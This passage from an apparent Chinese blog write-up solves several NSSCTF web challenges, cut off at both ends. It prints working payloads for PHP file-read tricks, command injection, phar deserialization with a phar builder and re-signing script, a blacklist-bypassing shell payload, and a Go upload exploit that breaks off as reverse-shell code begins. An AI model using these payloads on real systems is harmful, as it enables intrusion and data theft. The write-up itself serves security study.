class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里就涉及到一个新的东西叫  <code>include_once</code></p><p><img src="../images/image-20230327211231920.png" alt="image-20230327211231920"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/cwd/index.php</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-7-Team-ec-RCE"><a href="#NSSRound-7-Team-ec-RCE" class="headerlink" title="[NSSRound#7 Team]ec_RCE"></a>[NSSRound#7 Team]ec_RCE</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt;</span><br><span class="line">&lt;!-- By 探姬 --&gt;</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>就是靠个符号分隔符的含义</strong>      &amp;      &amp;&amp;     ||     ；</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=;&amp;data=<span class="string">&#x27;cat /flag&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h2><p><strong>考点</strong></p><p><img src="../images/image-20230327212719856.png" alt="image-20230327212719856"></p><p><img src="../images/image-20230327213330424.png" alt="image-20230327213330424"></p><p>源码给提示，就是给了注入点了，然后直接去注入就行了</p><p><a href="https://www.cnblogs.com/z2n3/p/16127279.html">这篇文章可以</a></p><p>就是对这道题讲解的非常详细</p><h2 id="NSSRound-4-SWPU-1zweb-revenge"><a href="#NSSRound-4-SWPU-1zweb-revenge" class="headerlink" title="[NSSRound#4 SWPU]1zweb(revenge)"></a>[NSSRound#4 SWPU]1zweb(revenge)</h2><p>考点</p><p><img src="../images/image-20230327213500110.png" alt="image-20230327213500110"></p><p>题目</p><p><img src="../images/image-20230327221113520.png" alt="image-20230327221113520"></p><p>这里就是给你查出源码，然后给你自己审计的过程</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的触发点就是<code>file_get_contents()</code>，这个会触发phar反序列化</p><p>那么这里的话就只需要绕过wakeup就行了</p><p><strong>生成phar文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下面这部分就没改</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;poc.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>运行后会生成poc.phar</p><p>然后修改一下值来绕过wakeup(就是修改这个类里边属性的数量就行)</p><p>由于需要绕过wakeup，因为是后面自己去改的数据，而<code>phar</code>文件的签名是第一次生成文件的时候自动生成的，所以当我们修改数据过后，由于签名错误，这个<code>phar</code>是无法被正常解析的，所以需要修改签名，让他变成一个正常的phar文件还需要对phar文件进行修改 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"> </span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;poc.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># 需要重新生成签名的phar文件</span></span><br><span class="line"> </span><br><span class="line">data = file[:-<span class="number">28</span>] <span class="comment"># 获取需要签名的数据</span></span><br><span class="line"> </span><br><span class="line">final = file[-<span class="number">8</span>:] <span class="comment"># 获取最后8位GBMB标识和签名类型</span></span><br><span class="line"> </span><br><span class="line">newfile = data+sha1(data).digest()+final <span class="comment"># 数据 + 签名 + 类型 + GBMB</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;newpoc.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newfile) <span class="comment"># 写入到新的phar文件</span></span><br></pre></td></tr></table></figure><p>新生成的phar包后，我们就去查看一下文件上传的代码</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传异常&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltj一眼就发现了phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功 ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里对文件后后缀进行了白名单，也对phar文件内容进行了检测，伪了绕过这两点</p><p>将文件压缩为zip文件，并把后缀改为png文件，这样文件内容和后缀白名单检测都绕过了(可能就是解压成zip文件后，phar标志性的东西<code>__HALT_COMPILER();</code>就检测不到了)</p><p><strong>phar://伪协议</strong><br><strong>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意 PHP&gt;=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式</strong></p><p>这就是phar协议的内容，所以这里就是为什么要解压成zip文件的原因</p><p>这里然后压缩成zip文件后，修改后缀名为png</p><p><img src="../images/image-20230327223103174.png" alt="image-20230327223103174"></p><p>上传成功后，使用phar伪协议传参</p><p><img src="../images/image-20230327223343549.png" alt="image-20230327223343549"></p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar:<span class="comment">//./upload/123.png/newpoc.phar </span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h2><p>考点</p><p><img src="../images/image-20230327224532343.png" alt="image-20230327224532343"></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Ňśś&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的代码就是很简陋，就是在/source那给了源码，然后在index函数发送请求并进行命令执行   ——-&gt;    <code>os.popen()</code></p><p>这里只要就是绕过黑名单的问题，写个脚本看看哪些没有被过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="built_in">print</span>(black)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> waf(<span class="built_in">chr</span>(i))):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        L.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;,&#x27;, &#x27;.&#x27;, &#x27;:&#x27;, &#x27;?&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;\x7f&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>和php的那个匹配脚本差不多，也是利用chr来写<br>选出常用的，包括<code>\t</code> <code>$</code> <code>&amp;</code> <code>()</code> <code>,</code> <code>.</code> <code>:</code> <code>?</code> 以及大小写字母（<code>过滤u n</code>)</p><p><strong>paylaod</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">cp%</span><span class="language-bash">09%24%28cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26echo%09%24%28pwd%29flag%29%09app%2Epy</span></span><br></pre></td></tr></table></figure><p><code>cp    $(cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;echo    $(pwd)flag)    app.py</code></p><p>就是利用shell里面的知识来写，$(xxx)这个里面会执行命令</p><p><img src="../images/image-20230328091657655.png" alt="image-20230328091657655"></p><p>然后这里前面给了flag在根目录了，然后这里就直接先cd返回到根目录，然后在使用pwd拿到/符号，因为此时已经cd到根目录了，对flag进行输出，然后使用cp命令将flag覆盖到app.py处，就是/source那里</p><h2 id="NSSRound-8-Basic-Upload-gogoggo"><a href="#NSSRound-8-Basic-Upload-gogoggo" class="headerlink" title="[NSSRound#8 Basic]Upload_gogoggo"></a>[NSSRound#8 Basic]Upload_gogoggo</h2><p>考点</p><p><img src="../images/image-20230328091957559.png" alt="image-20230328091957559"></p><p>题目</p><p><img src="../images/image-20230328092016055.png" alt="image-20230328092016055"></p><p><strong>golang的文件上传</strong>（属于是一个新的知识点)</p><p>这里的话go和php不同，他没有一句话木马，所以这里的话getshell是用</p><p>go run xx.go     xx.go文件里写的就是命令执行代码</p><p>例子代码</p><p>1.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    out, err := exec.Command(<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>).Output()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230328092748620.png" alt="image-20230328092748620"></p><p>运行成功</p><p>他这里是没有任何过滤的文件上传，所以就可以随便上点东西看看，这里上传了个1.php</p><p><img src="../images/image-20230328190306949.png" alt="image-20230328190306949"></p><p>不难发现，这里会执行命令<code>go 上传的文件名</code>，修改文件名为help试试</p><p><img src="../images/image-20230328190433293.png" alt="image-20230328190433293"></p><p>可以发现后台命令执行的代码大概长这样<code>命令执行(go 文件名前缀 文件路径)</code>，所以这里构造一下执行的命令，上传一个run.go文件，则会执行<code>go run run.go</code></p><p><strong>前面上传1.php只执行go 1的原因是没有1这个命令</strong></p><p>这里我们就直接用网上有的代码进行修改来反弹shell</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span 